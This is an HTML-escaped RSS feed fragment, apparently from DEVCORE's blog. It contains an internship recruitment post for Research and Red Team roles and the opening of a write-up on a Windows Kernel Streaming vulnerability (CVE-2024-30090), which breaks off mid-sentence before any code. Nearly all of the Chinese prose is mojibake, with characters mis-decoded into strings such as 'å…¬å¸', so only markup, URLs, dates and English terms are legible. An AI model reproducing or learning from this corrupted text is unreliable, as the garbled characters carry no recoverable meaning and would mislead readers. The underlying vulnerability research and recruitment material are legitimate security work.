&lt;h3 id=&quot;å…¬å¸åœ°é»&quot;&gt;å…¬å¸åœ°é»&lt;/h3&gt;

&lt;p&gt;å°åŒ—å¸‚æ¾å±±å€å…«å¾·è·¯ä¸‰æ®µ 32 è™Ÿ 13 æ¨“&lt;/p&gt;

&lt;h3 id=&quot;å¯¦ç¿’æ™‚é–“&quot;&gt;å¯¦ç¿’æ™‚é–“&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;2025 å¹´ 3 æœˆåˆåˆ° 2025 å¹´ 7 æœˆåº•ï¼Œå…± 5 å€‹æœˆ&lt;/li&gt;
  &lt;li&gt;æ¯é€±å·¥ä½œå…©å¤©ï¼Œå·¥ä½œæ™‚é–“ç‚º 10:00 â€“ 18:00
    &lt;ul&gt;
      &lt;li&gt;å…¶ä¸­ä¸€å¤© 14:00 - 18:00 å¿…é ˆåˆ°å…¬å¸åŒæ­¥é€²åº¦ï¼Œå…¶é¤˜æ™‚é–“ç‚ºé ç«¯ä½œæ¥­&lt;/li&gt;
      &lt;li&gt;å¦‚æœå±…ä½é›™åŒ—å¤–å¯å½ˆæ€§èª¿æ•´åŒæ­¥æ–¹å¼ï¼Œä½†é ˆæ¯å€‹çµ„åˆ¥çµ±ä¸€&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;æ‹›å‹Ÿå°è±¡&quot;&gt;æ‹›å‹Ÿå°è±¡&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;å…·æœ‰ä¸€å®šç¨‹åº¦è³‡å®‰èƒŒæ™¯çš„å­¸ç”Ÿï¼Œä¸”å¯æ¯é€±å·¥ä½œå…©å¤©&lt;/li&gt;
  &lt;li&gt;ç„¡å…¶ä»–æ‹›å‹Ÿé™åˆ¶ï¼Œæ­·å±†å¯¦ç¿’ç”Ÿå¯é‡è¤‡æ‡‰å¾µ&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;é è¨ˆæ‹›æ”¶åé¡&quot;&gt;é è¨ˆæ‹›æ”¶åé¡&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Research çµ„ï¼š2~3 äºº&lt;/li&gt;
  &lt;li&gt;Red Team çµ„ï¼š2~3 äºº&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;è–ªè³‡å¾…é‡&quot;&gt;è–ªè³‡å¾…é‡&lt;/h3&gt;

&lt;p&gt;æ¯æœˆæ–°å°å¹£ 18,000 å…ƒï¼ˆå¦è£œåŠ©éƒ¨åˆ†äº¤é€šè²»ï¼‰&lt;/p&gt;

&lt;h2 id=&quot;æ‹›å‹Ÿæ¢ä»¶è³‡æ ¼èˆ‡æµç¨‹&quot;&gt;æ‹›å‹Ÿæ¢ä»¶è³‡æ ¼èˆ‡æµç¨‹&lt;/h2&gt;

&lt;h3 id=&quot;å¯¦ç¿’æ¢ä»¶è¦æ±‚&quot;&gt;å¯¦ç¿’æ¢ä»¶è¦æ±‚&lt;/h3&gt;

&lt;h4 id=&quot;research-binaryweb&quot;&gt;Research (Binary/Web)&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;åŸºæœ¬æ¼æ´åˆ©ç”¨åŠæŒ–æ˜èƒ½åŠ›&lt;/li&gt;
  &lt;li&gt;å…·å‚™ç ”ç©¶ç†±èª ï¼Œç¿’æ…£äº†è§£æŠ€è¡“æœ¬è³ª&lt;/li&gt;
  &lt;li&gt;ç†Ÿæ‚‰ä»»ä¸€ç¨® Scripting Languageï¼ˆå¦‚ï¼šShell Scriptã€Pythonã€Rubyï¼‰ï¼Œä¸¦èƒ½ä½¿ç”¨è…³æœ¬è¼”ä»¥ç ”ç©¶&lt;/li&gt;
  &lt;li&gt;å…·å‚™é™¤éŒ¯èƒ½åŠ›ï¼Œèƒ½å–„ç”¨ Debugger è¿½è¹¤ç¨‹å¼æµç¨‹ã€èƒ½é‡ç¾ä¸¦æ”¶æ–‚å•é¡Œ&lt;/li&gt;
  &lt;li&gt;å…·å‚™ç¨ç«‹åˆ†æé–‹æ”¾åŸå§‹ç¢¼å°ˆæ¡ˆçš„èƒ½åŠ›ï¼Œèƒ½é€éåˆ†æç¨‹å¼ç¢¼ç†è§£ç›®æ¨™å°ˆæ¡ˆçš„æ¶æ§‹&lt;/li&gt;
  &lt;li&gt;ç†Ÿæ‚‰ä¸¦ç†è§£å¸¸è¦‹çš„æ¼æ´æˆå› 
    &lt;ul&gt;
      &lt;li&gt;OWASP Web Top 10&lt;/li&gt;
      &lt;li&gt;Memory Corruption&lt;/li&gt;
      &lt;li&gt;Race Condition&lt;/li&gt;
      &lt;li&gt;â€¦&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;åŠ åˆ†ä½†&lt;strong&gt;éå¿…è¦&lt;/strong&gt;æ¢ä»¶
    &lt;ul&gt;
      &lt;li&gt;CTF æ¯”è³½ç¶“é©—&lt;/li&gt;
      &lt;li&gt;pwnable.tw æˆç¸¾&lt;/li&gt;
      &lt;li&gt;æœ‰å…¬é–‹çš„æŠ€è¡“ blog/slideã€write-ups æˆ–æ˜¯æ¼”è¬›&lt;/li&gt;
      &lt;li&gt;ç²¾é€š IDA Pro æˆ– Ghidra&lt;/li&gt;
      &lt;li&gt;ç†Ÿæ‚‰ä»»ä¸€ç¨®ç¶²é ç¨‹å¼èªè¨€æˆ–æ¡†æ¶ï¼ˆå¦‚ï¼šPHPã€ASP.NETã€Express.jsï¼‰ï¼Œå…·å‚™å¯ä»¥å»ºç«‹å®Œæ•´ç¶²é æœå‹™çš„èƒ½åŠ›&lt;/li&gt;
      &lt;li&gt;ç†è§£ &lt;a href=&quot;https://portswigger.net/web-security/all-materials&quot;&gt;PortSwigger Web Security Academy&lt;/a&gt; ä¸­çš„å®‰å…¨è­°é¡Œ&lt;/li&gt;
      &lt;li&gt;ç¨ç«‹æŒ–æ˜é 0-day æ¼æ´ï¼Œæˆ–åˆ†æé 1-day çš„ç¶“é©—&lt;/li&gt;
      &lt;li&gt;å…·å‚™ä¸‹åˆ—å…¶ä¸­ä¹‹ä¸€ç¶“é©—
        &lt;ul&gt;
          &lt;li&gt;Web Application Exploit&lt;/li&gt;
          &lt;li&gt;Kernel Exploit&lt;/li&gt;
          &lt;li&gt;Windows Exploit&lt;/li&gt;
          &lt;li&gt;Browser Exploit&lt;/li&gt;
          &lt;li&gt;Bug Bounty&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;red-team&quot;&gt;Red Team&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;å¿…è¦æ¢ä»¶
    &lt;ul&gt;
      &lt;li&gt;ç†Ÿæ‚‰ OWASP Web Top 10&lt;/li&gt;
      &lt;li&gt;ç†è§£ &lt;a href=&quot;https://portswigger.net/web-security/all-materials&quot;&gt;PortSwigger Web Security Academy&lt;/a&gt; ä¸­æ‰€æœ‰çš„å®‰å…¨è­°é¡Œæˆ–å·²å®Œæˆæ‰€æœ‰ Lab&lt;/li&gt;
      &lt;li&gt;ç†è§£è¨ˆç®—æ©Ÿç¶²è·¯çš„åŸºæœ¬æ¦‚å¿µ&lt;/li&gt;
      &lt;li&gt;ç†Ÿæ‚‰ä»»ä¸€ç¨®ç¶²é ç¨‹å¼é–‹ç™¼æ–¹å¼ï¼ˆå¦‚ï¼šPHPã€ASP.NETã€JSPï¼‰ï¼Œå…·å‚™å¯ä»¥å»ºç«‹å®Œæ•´ç¶²é æœå‹™çš„èƒ½åŠ›&lt;/li&gt;
      &lt;li&gt;ç†Ÿæ‚‰ä»»ä¸€ç¨® Scripting Languageï¼ˆå¦‚ï¼šShell Scriptã€Pythonã€Rubyï¼‰ï¼Œä¸¦èƒ½ä½¿ç”¨è…³æœ¬è¼”ä»¥ç ”ç©¶&lt;/li&gt;
      &lt;li&gt;å…·å‚™é™¤éŒ¯èƒ½åŠ›ï¼Œèƒ½å–„ç”¨ Debugger è¿½è¹¤ç¨‹å¼æµç¨‹ã€èƒ½é‡ç¾ä¸¦æ”¶æ–‚å•é¡Œ&lt;/li&gt;
      &lt;li&gt;å…·å‚™å¯ä»¥å»ºç½®ã€è¨­å®šå¸¸è¦‹ä¼ºæœå™¨ï¼ˆå¦‚ï¼šNginxã€Apacheã€Tomcatã€IISã€Active Directoryï¼‰åŠä½œæ¥­ç³»çµ±ï¼ˆå¦‚ï¼šLinuxã€Windowsï¼‰çš„èƒ½åŠ›&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;åŠ åˆ†ä½†&lt;strong&gt;éå¿…è¦&lt;/strong&gt;æ¢ä»¶
    &lt;ul&gt;
      &lt;li&gt;æ›¾ç¶“ç¨ç«‹æŒ–æ˜é 0-day æ¼æ´&lt;/li&gt;
      &lt;li&gt;æ›¾ç¶“ç¨ç«‹åˆ†æéå·²çŸ¥æ¼æ´ä¸¦èƒ½æ’°å¯« 1-day Exploit&lt;/li&gt;
      &lt;li&gt;æ›¾ç¶“æ–¼ CTF æ¯”è³½ä¸­æ“”ä»»å‡ºé¡Œè€…ä¸¦å»ºç½®éé¡Œç›®&lt;/li&gt;
      &lt;li&gt;æ“æœ‰ OSCP è­‰ç…§æˆ–åŒç­‰èƒ½åŠ›ä¹‹è­‰ç…§&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;æ‡‰å¾µæµç¨‹&quot;&gt;æ‡‰å¾µæµç¨‹&lt;/h3&gt;

&lt;p&gt;æœ¬æ¬¡ç”„é¸ä¸€å…±åˆ†ç‚ºäºŒå€‹éšæ®µï¼š&lt;/p&gt;

&lt;h4 id=&quot;ç¬¬ä¸€éšæ®µæ›¸é¢å¯©æŸ¥&quot;&gt;ç¬¬ä¸€éšæ®µï¼šæ›¸é¢å¯©æŸ¥&lt;/h4&gt;

&lt;p&gt;ç¬¬ä¸€éšæ®µç‚ºæ›¸é¢å¯©æŸ¥ï¼Œæœƒéœ€è¦å¯©æŸ¥ä¸‹åˆ—å…©å€‹é …ç›®&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;å±¥æ­·å…§å®¹&lt;/li&gt;
  &lt;li&gt;ç°¡ç­”é¡Œç­”æ¡ˆ
    &lt;ul&gt;
      &lt;li&gt;æ‡‰å¾µ Research å¯¦ç¿’ç”Ÿï¼š
        &lt;ul&gt;
          &lt;li&gt;é¡Œç›®ä¸€ï¼šæ¼æ´é‡ç¾èˆ‡åˆ†æéç¨‹
            &lt;ul&gt;
              &lt;li&gt;è«‹æå‡ºä¸€å€‹ï¼Œä½ å°è±¡æœ€æ·±åˆ»æˆ–æ„Ÿåˆ°æœ‰è¶£ã€æ–¼è¥¿å…ƒ 2022 ~ 2025 å¹´é–“å…¬é–‹çš„çœŸå¯¦æ¼æ´æˆ–æ”»æ“Šéˆæ¡ˆä¾‹ï¼Œä¸¦ä¾è‡ªå·±çš„ç†è§£è©³è¿°èªªæ˜æ¼æ´çš„æˆå› ã€åˆ©ç”¨æ¢ä»¶å’Œå¯ä»¥é€ æˆçš„å½±éŸ¿ã€‚åŒæ™‚ï¼Œå˜—è©¦æè¿°å¦‚ä½•å¾©ç¾æ­¤æ¼æ´æˆ–æ”»æ“Šéˆï¼Œå³ä½¿ç„¡æ³•æˆåŠŸå¾©ç¾ï¼Œä¹Ÿè«‹è¨˜éŒ„ç ”ç©¶éç¨‹ã€‚å ±å‘Šæ’°å¯«è«‹åƒè€ƒ&lt;a href=&quot;/assets/files/recruit/DEVCORE-intern_vulnerability_analysis_example.pdf&quot;&gt;ç¯„æœ¬&lt;/a&gt;ï¼Œç›¡å¯èƒ½è©³ç´°ï¼Œä¸­è‹±ä¸é™ã€‚&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;é¡Œç›®äºŒï¼šå¯¦ç¿’æœŸé–“æƒ³è¦ç ”ç©¶çš„ä¸»é¡Œ
            &lt;ul&gt;
              &lt;li&gt;è«‹æå‡ºä¸‰å€‹å¯èƒ½é¸æ“‡çš„æ˜ç¢ºä¸»é¡Œï¼Œä¸¦ç°¡å–®èªªæ˜æå‡ºçš„ç†ç”±æˆ–æƒ³å®Œæˆçš„å…§å®¹ï¼Œä¾‹å¦‚ï¼š
                &lt;ul&gt;
                  &lt;li&gt;ç ”ç©¶â—¯â—¯é–‹æºè»Ÿé«”ï¼Œæ‰¾åˆ°å¯ RCE çš„é‡å¤§é¢¨éšªå¼±é»ã€‚&lt;/li&gt;
                  &lt;li&gt;ç ”ç©¶å¸¸è¦‹çš„è·¯ç”±å™¨ï¼Œç›®æ¨™åŒ…æ‹¬ï¼šAA-123 è·¯ç”±å™¨ã€BB-456 ç„¡ç·šè·¯ç”±å™¨ã€‚&lt;/li&gt;
                  &lt;li&gt;ç ”ç©¶å¸¸è¦‹çš„ç­†è¨˜å¹³å°æˆ–è»Ÿé«”ï¼Œç›®æ¨™åŒ…æ‹¬ï¼šXX Noteã€YY Noteã€‚&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;æ‡‰å¾µ Red Team å¯¦ç¿’ç”Ÿï¼š
        &lt;ul&gt;
          &lt;li&gt;è«‹æå‡ºå…©å€‹æ–¼è¥¿å…ƒ 2022 ~ 2025 å¹´é–“å…¬é–‹çš„ã€èˆ‡ Web æ”»æ“Šé¢ã€ç´…éšŠæ‰‹æ³•ã€æ¼æ´æˆ–æ”»æ“Šéˆç›¸é—œçš„æŠ€è¡“æ¼”è¬›ï¼Œè«‹èªªæ˜ç‚ºä»€éº¼æŒ‘é¸é€™äº›æ¼”è¬›ä¸¦è§£é‡‹å®ƒå€‘ç‚ºä»€éº¼æœ‰è¶£ã€‚
            &lt;ul&gt;
              &lt;li&gt;è«‹ç”¨ä½ çš„ç†è§£é‡æ–°ä»¥æ–‡å­—è©³ç´°è§£é‡‹é€™äº›æ¼”è¬›çš„æŠ€è¡“ç´°ç¯€ï¼Œæ•´ç†æˆä¸€ä»½ Write-up ä»¥ PDF æ ¼å¼è¼¸å‡ºï¼Œä¸¦æä¾›ä»»ä½•ä½ è¦ºå¾—å¯ä»¥è¼”åŠ©æˆ–è­‰æ˜ä½ ç†è§£çš„é™„åŠ è³‡æ–™ã€‚&lt;/li&gt;
              &lt;li&gt;é€™äº›æ¼”è¬›å¯ä»¥ä¾†è‡ªåŒ…å«ä½†ä¸é™æ–¼ Black Hatã€DEF CONã€OffensiveConã€POCã€ZeroConfã€Hexaconã€HITCONã€TROOPERS CONFERENCE ç­‰æœƒè­°ã€‚&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;ç¬¬äºŒéšæ®µé¢è©¦&quot;&gt;ç¬¬äºŒéšæ®µï¼šé¢è©¦&lt;/h4&gt;

&lt;p&gt;æ­¤éšæ®µç‚º 30~120 åˆ†é˜ï¼ˆä¾ç…§çµ„åˆ¥éœ€æ±‚è€Œå®šï¼Œæœƒå¦è¡Œé€šçŸ¥ï¼‰çš„é¢è©¦ï¼Œæœƒæœ‰ 2~3 ä½è³‡æ·±å¤¥ä¼´åƒèˆ‡ï¼Œè©•ä¼°æ‚¨æ˜¯å¦å…·å‚™æœ¬æ¬¡å¯¦ç¿’æ‰€éœ€çš„æŠ€è¡“èƒ½åŠ›èˆ‡äººæ ¼ç‰¹è³ªã€‚&lt;/p&gt;

&lt;h4 id=&quot;æ™‚é–“è»¸&quot;&gt;æ™‚é–“è»¸&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;2024/12/02 - 2025/01/05 å…¬é–‹æ‹›å‹Ÿï¼Œæ¥æ”¶å±¥æ­·èˆ‡ç¬¬ä¸€éšæ®µå¯©æ ¸&lt;/li&gt;
  &lt;li&gt;2025/01/06 - 2025/01/23 ç¬¬äºŒéšæ®µé¢è©¦ï¼ˆè‹¥å ±åè¸´èºæœƒæå‰é–‹å§‹é¢è©¦ï¼‰&lt;/li&gt;
  &lt;li&gt;2025/01/24 å‰å›æ‡‰çµæœ&lt;/li&gt;
  &lt;li&gt;2025/03/03 ç¬¬ä¸ƒå±†å¯¦ç¿’è¨ˆç•«æ–¼ç•¶é€±é–‹å§‹&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;å ±åæ–¹å¼&quot;&gt;å ±åæ–¹å¼&lt;/h3&gt;

&lt;p&gt;ç‚ºäº†è®“æœ‰æ„åƒåŠ å¯¦ç¿’è¨ˆç•«çš„åŒå­¸æœ‰æ›´å¤šæ™‚é–“æº–å‚™ï¼Œæˆ‘å€‘é€™æ¬¡å˜—è©¦ä½¿ç”¨ Google è¡¨å–®ä½œç‚ºå ±åå¹³å°ã€‚æ‚¨å¯ä»¥é€éå¡«å¯«è¡¨å–®é€²è¡Œå ±åï¼Œä¸”åœ¨æˆªæ­¢æ™‚é–“ &lt;strong&gt;2025/01/05 23:59&lt;/strong&gt; ä»¥å‰ï¼Œæ‚¨å¯ä»¥éš¨æ™‚ç·¨è¼¯å·²æäº¤çš„è¡¨å–®ï¼Œæˆ–æ˜¯é‡æ–°å¡«å¯«ä¸€ä»½æ–°çš„è¡¨å–®ä¾†æ›´æ–°å ±åè³‡è¨Šã€‚è«‹æ³¨æ„ï¼Œæˆ‘å€‘æœƒä»¥&lt;strong&gt;æœ€å¾Œä¸€æ¬¡&lt;/strong&gt;æäº¤çš„è¡¨å–®å…§å®¹ä½œç‚ºå¯©æ ¸ä¾æ“šã€‚&lt;/p&gt;

&lt;p&gt;è«‹æ–¼ &lt;strong&gt;2025/01/05 23:59&lt;/strong&gt; å‰å®Œæˆå¡«å¯« &lt;a href=&quot;https://forms.gle/CWW7aeebXXVt3kjv6&quot;&gt;Google è¡¨å–®&lt;/a&gt;ä¸¦ä¸Šå‚³ç›¸é—œé™„ä»¶ã€‚ä»¥ä¸‹ç‚ºå¡«å¯«è¡¨å–®çš„æ³¨æ„äº‹é …ï¼š&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;æª”æ¡ˆç¶“ä¸Šå‚³å¾Œç„¡æ³•åˆªé™¤æˆ–ä¿®æ”¹ï¼Œæ¬²æ›´æ–°æª”æ¡ˆè«‹é‡æ–°å¡«å¯«ä¸€ä»½è¡¨å–®&lt;/li&gt;
  &lt;li&gt;è«‹å‹™å¿…æ–¼&lt;strong&gt;æˆªæ­¢æ™‚é–“ï¼ˆ2025/01/06 23:59ï¼‰&lt;/strong&gt; å‰å®Œæˆæ‰€æœ‰è¡¨å–®å¡«å¯«èˆ‡æª”æ¡ˆä¸Šå‚³ï¼Œé€¾æœŸæœªå®Œæˆè€…å°‡è¦–åŒæ”¾æ£„æ‡‰å¾µè³‡æ ¼&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å ±åæˆªæ­¢å¾Œï¼Œæˆ‘å€‘æœƒæ ¹æ“šæ‚¨æäº¤çš„å ±åå…§å®¹é€²è¡Œç¬¬ä¸€éšæ®µå¯©æ ¸ã€‚å¯©æ ¸çµæœå°‡æ–¼ &lt;strong&gt;2025/01/13&lt;/strong&gt; å‰é€šçŸ¥ï¼Œä¸¦å®‰æ’é€²ä¸€æ­¥çš„é¢è©¦ã€‚æœ€çµ‚éŒ„å–åå–®å°‡æ–¼ &lt;strong&gt;2025/01/24&lt;/strong&gt; å…¬ä½ˆï¼Œæˆ‘å€‘ä¹ŸæœƒåŒæ­¥é€šçŸ¥éŒ„å–æƒ…æ³ã€‚&lt;/p&gt;

&lt;p&gt;è‹¥æœ‰æ‡‰å¾µç›¸é—œå•é¡Œï¼Œè«‹ä¸€å¾‹å¯„ä¿¡åˆ° recruiting_intern@devco.reï¼Œå¦‚é€ æˆæ‚¨çš„ä¸ä¾¿è«‹è¦‹è«’ï¼Œæˆ‘å€‘æ„Ÿè¬æ‚¨çš„ä¾†ä¿¡ï¼Œä¸¦æœŸå¾…æ‚¨çš„åŠ å…¥ï¼&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2024/12/02/7th-internship-program-recruit/</link>
                <guid>https://devco.re/blog/2024/12/02/7th-internship-program-recruit</guid>
                <pubDate>Mon, 02 Dec 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Streaming vulnerabilities from Windows Kernel - Proxying to Kernel - Part II</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2024/10/05/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part2-en/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2024/10/05/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part2/&quot;&gt;ä¸­æ–‡ç‰ˆæœ¬&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;é€™æ˜¯ä¸€ç³»åˆ—æœ‰é—œ Kernel Streaming çš„ç›¸é—œçš„æ¼æ´ç ”ç©¶ï¼Œå»ºè­°å…ˆé–±è®€ä»¥ä¸‹æ–‡ç« &lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1/&quot;&gt;Streaming vulnerabilities from Windows Kernel - Proxying to Kernel - Part I&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;åœ¨å…ˆå‰ Proxying to Kernel çš„ç ”ç©¶ä¸­ï¼Œæˆ‘å€‘åœ¨ Kernel Streaming ä¸­æ‰¾åˆ°äº†å¤šå€‹æ¼æ´ä»¥åŠä¸€å€‹è¢«å¿½è¦–çš„ Bug Classï¼Œä¸¦åœ¨ä»Šå¹´ Pwn2Own Vancouver 2024 ä¸­åˆ©ç”¨æ¼æ´ &lt;a href=&quot;https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1/#cve-2024-35250&quot;&gt;CVE-2024-35250&lt;/a&gt; åŠ &lt;a href=&quot;https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1/#cve-2024-30084&quot;&gt;CVE-2024-30084&lt;/a&gt; æˆåŠŸæ”»ä¸‹ Windows 11ã€‚&lt;/p&gt;

&lt;p&gt;è€Œåœ¨é€™ç¯‡ç ”ç©¶ä¸­ï¼Œæˆ‘å€‘å°‡ç¹¼çºŒå»¶çºŒé€™å€‹æ”»æ“Šé¢å’Œé€™å€‹ Bug Classï¼Œä¹Ÿå°‡æ­éœ²å¦å¤–ä¸€å€‹æ¼æ´å’Œåˆ©ç”¨æ‰‹æ³•ï¼Œäº¦ç™¼è¡¨æ–¼ &lt;a href=&quot;https://www.hexacon.fr/conference/speakers/&quot;&gt;HEXACON 2024&lt;/a&gt; ä¸­ã€‚&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;åœ¨ Pwn2Own Vancouver 2024 ä¹‹å¾Œï¼Œæˆ‘å€‘ç¹¼çºŒé‡å° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks!KsSynchronousIoControlDevice&lt;/code&gt; é€™å€‹ bug pattern å»çœ‹çœ‹æœ‰æ²’æœ‰å…¶ä»–å®‰å…¨æ€§ä¸Šçš„å•é¡Œï¼Œç„¶è€Œæ‰¾äº†ä¸€æ®µæ™‚é–“å¾Œï¼Œé‡å° KS Object çš„ Property æ“ä½œä¸­ï¼Œä¸¦æ²’æœ‰æ‰¾åˆ°å…¶ä»–å¯ä»¥åˆ©ç”¨çš„é»ï¼Œå› è€Œæˆ‘å€‘å°‡æ–¹å‘è½‰å¾€å¦å¤–ä¸€å€‹åŠŸèƒ½ &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/ks-events&quot;&gt;KS Event&lt;/a&gt; ä¸Šã€‚&lt;/p&gt;

&lt;h2 id=&quot;ks-event&quot;&gt;KS Event&lt;/h2&gt;
&lt;p&gt;KS Event èˆ‡å‰ä¸€ç¯‡æåˆ°çš„ KS Property é¡ä¼¼ã€‚KS Object ä¸­é™¤äº†æœ‰è‡ªå·±çš„ Property Set ä¹‹å¤–ï¼Œä¹Ÿæœ‰æä¾›è¨­å®š KS Event çš„åŠŸèƒ½ï¼Œæ¯”å¦‚èªªä½ å¯ä»¥è¨­å®šè¨­å‚™ç‹€æ…‹æ”¹è®Šæˆ–æ˜¯æ¯å€‹ä¸€æ®µæ™‚é–“å°±è§¸ç™¼ Eventï¼Œæ–¹ä¾¿æ’­æ”¾è»Ÿé«”ç­‰é–‹ç™¼è€…å®šç¾©å¾ŒçºŒçš„è¡Œç‚ºï¼Œè€Œæ¯å€‹ KS Event å°±å¦‚åŒ Property ä¸€æ¨£ï¼Œè¦ä½¿ç”¨å°±å¿…é ˆè©² KS Object æœ‰æ”¯æ´ã€‚æˆ‘å€‘å¯ä»¥é€é &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/ks/ni-ks-ioctl_ks_enable_event&quot;&gt;IOCTL_KS_ENABLE_EVENT&lt;/a&gt;  åŠ &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/ks/ni-ks-ioctl_ks_disable_event&quot;&gt;IOCTL_KS_DISABLE_EVENT&lt;/a&gt; ä¾†è¨»å†Šæˆ–é—œé–‰é€™äº› Eventã€‚&lt;/p&gt;

&lt;h3 id=&quot;kseventdata&quot;&gt;KSEVENTDATA&lt;/h3&gt;
&lt;p&gt;è€Œåœ¨è¨»å†Š KS Event æ™‚ï¼Œä½ å¯ä»¥è—‰ç”±æä¾› &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ks/ns-ks-kseventdata&quot;&gt;KSEVENTDATA&lt;/a&gt; ä¾†è¨»å†Šä½ æƒ³è¦çš„äº‹ä»¶ï¼Œå…¶ä¸­å¯ä»¥æä¾› EVENT_HANDLE åŠ SEMAPHORE_HANDLE ç­‰ handle ä¾†è¨»å†Šï¼Œç•¶ KS è§¸ç™¼é€™å€‹äº‹ä»¶æ™‚ï¼Œå°±æœƒè—‰ç”±é€™å€‹ handle ä¾†é€šçŸ¥ä½ ã€‚&lt;/p&gt;

&lt;h3 id=&quot;the-work-flow-of-ioctl_ks_enable_event&quot;&gt;The work flow of IOCTL_KS_ENABLE_EVENT&lt;/h3&gt;
&lt;p&gt;å…¶æ•´å€‹é‹ä½œæµç¨‹ä¹Ÿèˆ‡ IOCTL_KS_PROPERTY é›·åŒï¼Œåœ¨å‘¼å« DeviceIoControl æ™‚ï¼Œå°±æœƒåƒä¸‹åœ–ä¸€æ¨£ï¼Œå°‡ä½¿ç”¨è€…çš„ requests ä¾åºçµ¦ç›¸å°æ‡‰çš„ driver ä¾†è™•ç†&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åŒæ¨£æœƒåœ¨ç¬¬ 3 æ­¥æ™‚åš 32-bit çš„ requests è½‰æ›æˆ 64-bit çš„ requestsã€‚åˆ°ç¬¬ 6 æ­¥æ™‚ ks.sys å°±æœƒæ ¹æ“šä½  requests çš„ Event ä¾†æ±ºå®šè¦äº¤çµ¦å“ªå€‹ driver åŠ &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ks/nc-ks-pfnksaddevent&quot;&gt;addhandler&lt;/a&gt; ä¾†è™•ç†ä½ çš„ requestã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æœ€çµ‚å†è½‰ç™¼çµ¦ç›¸å°æ‡‰çš„ Driverã€‚å¦‚ä¸Šåœ–ä¸­æœ€å¾Œè½‰ç™¼çµ¦ ks ä¸­çš„ KsiDefaultClockAddMarkEvent ä¾†&lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/nf-wdm-kesettimerex&quot;&gt;è¨­ç½® Timer&lt;/a&gt;ã€‚&lt;/p&gt;

&lt;p&gt;åœ¨äº†è§£äº† KS Event åŠŸèƒ½åŠæµç¨‹å¾Œï¼Œæ ¹æ“šä¹‹å‰çš„ &lt;a href=&quot;https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1/#the-new-bug-pattern&quot;&gt;bug pattern&lt;/a&gt; å¾ˆå¿«åœ°åˆæ‰¾åˆ°äº†ä¸€å€‹å¯ä»¥åˆ©ç”¨çš„æ¼æ´ &lt;a href=&quot;https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-30090&quot;&gt;CVE-2024-30090&lt;/a&gt;ã€‚&lt;/p&gt;

&lt;h2 id=&quot;proxying-to-kernel-again-&quot;&gt;Proxying to kernel again !&lt;/h2&gt;
&lt;p&gt;é€™æ¬¡çš„å•é¡Œé»ç™¼ç”Ÿåœ¨ ksthunk å°‡ 32-bit request è½‰æ›æˆ 64-bit request çš„éç¨‹ã€‚&lt;/p&gt;

&lt;p&gt;å¦‚ä¸‹åœ–ï¼Œç•¶ ksthunk æ¥æ”¶åˆ°ä¾†è‡ª WoW64 Process çš„ IOCTL_KS_ENABLE_EVENT æ™‚ï¼Œæœƒé€²è¡Œ 32-bit çµæ§‹åˆ° 64-bit çµæ§‹çš„è½‰æ›
